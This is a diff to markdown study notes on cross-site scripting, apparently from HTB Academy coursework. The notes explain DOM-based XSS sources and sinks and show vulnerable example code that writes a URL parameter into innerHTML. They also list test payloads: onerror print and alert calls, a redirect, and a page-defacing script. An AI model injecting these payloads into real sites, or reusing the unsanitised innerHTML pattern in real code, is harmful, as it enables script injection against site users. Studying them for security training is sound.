@@ -25,8 +25,13 @@ Test with JS
 ```
 
 ## DOM-Based
-> Done completely in the client browser. No request to server on data entry. Easily confused for relfected XSS. Needs a trigger to run the payload, such as 'img src=""'
-* Test Payloads 
+> Done completely in the client browser. No request to server on data entry. Easily confused for relfected XSS. Needs a trigger to run the payload, such as 'img src=""'  
+
+Completely Processed on the client side (JS used to change page source through the Document Object Model(DOM) No HTTP requests made (Developer Toos/Network Tab) Check the URL for the parameters Page source does not change when refreshed (Parameter passed in the URL rather than added to the page source)   
+**Source**=JS object that takes user input (Can be any input parameter like a url parameter or an input field)   
+**Sink**=JS function that writes user input to a DOM object on the page.  
+
+Test Payloads 
 ```javascript
 # Loads the print dialog
 <img src=x onerror=print(1)>
@@ -36,6 +41,23 @@ Test with JS
 
 # Send the user to another site 
 <img src=x onerror="window.location.href='https://google.com'">
+```
+Common JS Functions that write to DOM objects
+```javascript
+document.write()
+DOM.innerHTML
+DOM.outerHTML
+```Common jQuery library functions that write to DOM objects
+```javascript
+add()
+after()
+append()
+```
+Example source code
+```javascript
+var pos = document.URL.indexOf("task=");#task paramter in URL
+var task = document.URL.substring(pos + 5, document.URL.length);
+document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);#innerHTML used to write to the screen (task)
 ```
 
 ## Reflected
@@ -189,41 +211,6 @@ document.getElementsByTagName('body')[0].innerHTML = "New Text"
 ```
 ```html
 <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
-```
-
-To verify the payload is stored on the back-end, refresh the page. If the alert comes back, it's stored/persistent
-
-### DOM-Based
-Completely Processed on the client side (JS used to change page source through the Document Object Model(DOM)
-No HTTP requests made (Developer Toos/Network Tab)
-Check the URL for the parameters
-Page source does not change when refreshed (Parameter passed in the URL rather than added to the page source)
-**Source**=JS object that takes user input (Can be any input parameter like a url parameter or an input field)
-**Sink**=JS function that writes user input to a DOM object on the page. 
-
-Common JS Functions that write to DOM objects:
-```javascript
-document.write()
-DOM.innerHTML
-DOM.outerHTML
-```Common jQuery library functions that write to DOM objects
-```javascript
-add()
-after()
-append()
-```
-
-Example:
-```javascript
-var pos = document.URL.indexOf("task=");#task paramter in URL
-var task = document.URL.substring(pos + 5, document.URL.length);
-```
-```javascript
-document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);#innerHTML used to write to the screen (task)
-```
-Test Payloads
-```html
-<img src="" onerror=alert(window.origin)>
 ```
 
 # Misc Payloads
